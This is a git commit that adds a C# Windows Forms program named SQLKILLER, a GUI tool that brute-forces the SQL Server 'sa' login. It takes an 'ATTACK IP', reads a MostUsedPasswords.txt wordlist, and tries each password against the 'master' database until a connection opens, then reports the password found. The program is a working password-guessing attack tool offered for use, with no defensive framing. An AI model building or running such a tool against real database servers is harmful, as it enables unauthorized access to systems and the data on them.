ba9da6736cd9d47867cd2b4e3b448d59650c8d54
Caner Ay Celep <72454642+caner24@users.noreply.github.com>
2023-01-20 21:18:30 +0300

    Add project files.

---
+++ SQLKILLER/Form1.Designer.cs
@@ -0,0 +1,242 @@
+﻿namespace SQLKILLER
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.tbxUser = new System.Windows.Forms.TextBox();
+            this.tbxIp = new System.Windows.Forms.TextBox();
+            this.tbxDB = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label1 = new System.Windows.Forms.Label();
+            this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.panel2 = new System.Windows.Forms.Panel();
+            this.listBox1 = new System.Windows.Forms.ListBox();
+            this.lblTime = new System.Windows.Forms.Label();
+            this.lblPassword = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.panel1.SuspendLayout();
+            this.panel2.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // panel1
+            // 
+            this.panel1.Controls.Add(this.tbxUser);
+            this.panel1.Controls.Add(this.tbxIp);
+            this.panel1.Controls.Add(this.tbxDB);
+            this.panel1.Controls.Add(this.button1);
+            this.panel1.Controls.Add(this.label3);
+            this.panel1.Controls.Add(this.label2);
+            this.panel1.Controls.Add(this.label1);
+            this.panel1.Location = new System.Drawing.Point(12, 12);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(185, 252);
+            this.panel1.TabIndex = 0;
+            // 
+            // tbxUser
+            // 
+            this.tbxUser.Enabled = false;
+            this.tbxUser.Location = new System.Drawing.Point(18, 171);
+            this.tbxUser.Name = "tbxUser";
+            this.tbxUser.Size = new System.Drawing.Size(137, 23);
+            this.tbxUser.TabIndex = 6;
+            this.tbxUser.Text = "sa";
+            // 
+            // tbxIp
+            // 
+            this.tbxIp.Location = new System.Drawing.Point(18, 100);
+            this.tbxIp.Name = "tbxIp";
+            this.tbxIp.Size = new System.Drawing.Size(137, 23);
+            this.tbxIp.TabIndex = 5;
+            // 
+            // tbxDB
+            // 
+            this.tbxDB.Enabled = false;
+            this.tbxDB.Location = new System.Drawing.Point(18, 37);
+            this.tbxDB.Name = "tbxDB";
+            this.tbxDB.Size = new System.Drawing.Size(137, 23);
+            this.tbxDB.TabIndex = 4;
+            this.tbxDB.Text = "master";
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(3, 200);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(179, 48);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "TRY-PASSWORD";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Arial Black", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label3.Location = new System.Drawing.Point(42, 150);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(98, 18);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "SUSERNAME";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Arial Black", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label2.Location = new System.Drawing.Point(42, 79);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(87, 18);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "ATTACK IP ";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Arial Black", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point);
+            this.label1.Location = new System.Drawing.Point(26, 16);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(129, 18);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "LOCALMACHINE ";
+            // 
+            // progressBar1
+            // 
+            this.progressBar1.Location = new System.Drawing.Point(203, 15);
+            this.progressBar1.Name = "progressBar1";
+            this.progressBar1.Size = new System.Drawing.Size(647, 23);
+            this.progressBar1.TabIndex = 2;
+            // 
+            // panel2
+            // 
+            this.panel2.BackColor = System.Drawing.Color.Black;
+            this.panel2.Controls.Add(this.listBox1);
+            this.panel2.Controls.Add(this.lblTime);
+            this.panel2.Controls.Add(this.lblPassword);
+            this.panel2.Controls.Add(this.label5);
+            this.panel2.Controls.Add(this.label4);
+            this.panel2.Location = new System.Drawing.Point(203, 49);
+            this.panel2.Name = "panel2";
+            this.panel2.Size = new System.Drawing.Size(647, 211);
+            this.panel2.TabIndex = 3;
+            // 
+            // listBox1
+            // 
+            this.listBox1.FormattingEnabled = true;
+            this.listBox1.ItemHeight = 15;
+            this.listBox1.Location = new System.Drawing.Point(3, 83);
+            this.listBox1.Name = "listBox1";
+            this.listBox1.Size = new System.Drawing.Size(641, 124);
+            this.listBox1.TabIndex = 4;
+            // 
+            // lblTime
+            // 
+            this.lblTime.AutoSize = true;
+            this.lblTime.BackColor = System.Drawing.Color.White;
+            this.lblTime.Font = new System.Drawing.Font("Arial Black", 15F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point);
+            this.lblTime.Location = new System.Drawing.Point(366, 44);
+            this.lblTime.Name = "lblTime";
+            this.lblTime.Size = new System.Drawing.Size(47, 28);
+            this.lblTime.TabIndex = 3;
+            this.lblTime.Text = ". . .";
+            // 
+            // lblPassword
+            // 
+            this.lblPassword.AutoSize = true;
+            this.lblPassword.BackColor = System.Drawing.Color.White;
+            this.lblPassword.Font = new System.Drawing.Font("Arial Black", 15F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point);
+            this.lblPassword.Location = new System.Drawing.Point(366, 10);
+            this.lblPassword.Name = "lblPassword";
+            this.lblPassword.Size = new System.Drawing.Size(54, 28);
+            this.lblPassword.TabIndex = 2;
+            this.lblPassword.Text = ". . . ";
+            this.lblPassword.Click += new System.EventHandler(this.label6_Click);
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.BackColor = System.Drawing.Color.White;
+            this.label5.Font = new System.Drawing.Font("Arial Black", 15F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point);
+            this.label5.Location = new System.Drawing.Point(145, 44);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(188, 28);
+            this.label5.TabIndex = 1;
+            this.label5.Text = "FİND BY TİME : ";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.BackColor = System.Drawing.Color.White;
+            this.label4.Font = new System.Drawing.Font("Arial Black", 15F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point);
+            this.label4.Location = new System.Drawing.Point(145, 10);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(158, 28);
+            this.label4.TabIndex = 0;
+            this.label4.Text = "PASSWORD : ";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Azure;
+            this.ClientSize = new System.Drawing.Size(862, 268);
+            this.Controls.Add(this.panel2);
+            this.Controls.Add(this.progressBar1);
+            this.Controls.Add(this.panel1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "SQLKILLER";
+            this.panel1.ResumeLayout(false);
+            this.panel1.PerformLayout();
+            this.panel2.ResumeLayout(false);
+            this.panel2.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Panel panel1;
+        private System.Windows.Forms.TextBox tbxUser;
+        private System.Windows.Forms.TextBox tbxIp;
+        private System.Windows.Forms.TextBox tbxDB;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.ProgressBar progressBar1;
+        private System.Windows.Forms.Panel panel2;
+        private System.Windows.Forms.Label lblTime;
+        private System.Windows.Forms.Label lblPassword;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.ListBox listBox1;
+    }
+}
---
+++ SQLKILLER/Form1.cs
@@ -0,0 +1,74 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Data.SqlClient;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Xml.Linq;
+
+namespace SQLKILLER
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void label6_Click(object sender, EventArgs e)
+        {
+
+        }
+        private void button1_Click(object sender, EventArgs e)
+        {
+            int sayac = 0;
+            DateTime startedTime = DateTime.Now;
+            int count = File.ReadAllLines(Application.StartupPath + "MostUsedPasswords.txt").Length;
+            StreamReader streamReader = new StreamReader(Application.StartupPath + "MostUsedPasswords.txt");
+            for (int i = 0; i < count; i++)
+            {
+                if (i % 100 == 0)
+                {
+                    listBox1.Items.Clear();
+                    this.Update();
+                }
+                string pwd = streamReader.ReadLine();
+                progressBar1.Value += 5;
+                listBox1.Items.Add(pwd);
+                this.Update();
+                sayac++;
+                if (sayac == 20)
+                {
+                    sayac = 0;
+                    progressBar1.Value = 0;
+                }
+                try
+                {
+                    string conn = "DATA SOURCE=" + tbxIp.Text.ToString() + ";INITIAL CATALOG=" + tbxDB.Text.ToString() + ";UID=" + tbxUser.Text.ToString() + ";PASSWORD=" + pwd.ToString() + ";CONNECT TIMEOUT=1";
+                    SqlConnection connection = new SqlConnection(conn);
+                    connection.Open();
+                    if (connection.State == ConnectionState.Open)
+                    {
+                        progressBar1.Value = 100;
+                        lblPassword.Text = pwd;
+                        TimeSpan ts = DateTime.Now - startedTime;
+                        lblTime.Text = ts.ToString(@"hh\:mm\:ss");
+                        return;
+                    }
+                }
+                catch (Exception)
+                {
+                }
+
+
+            }
+        }
+    }
+}
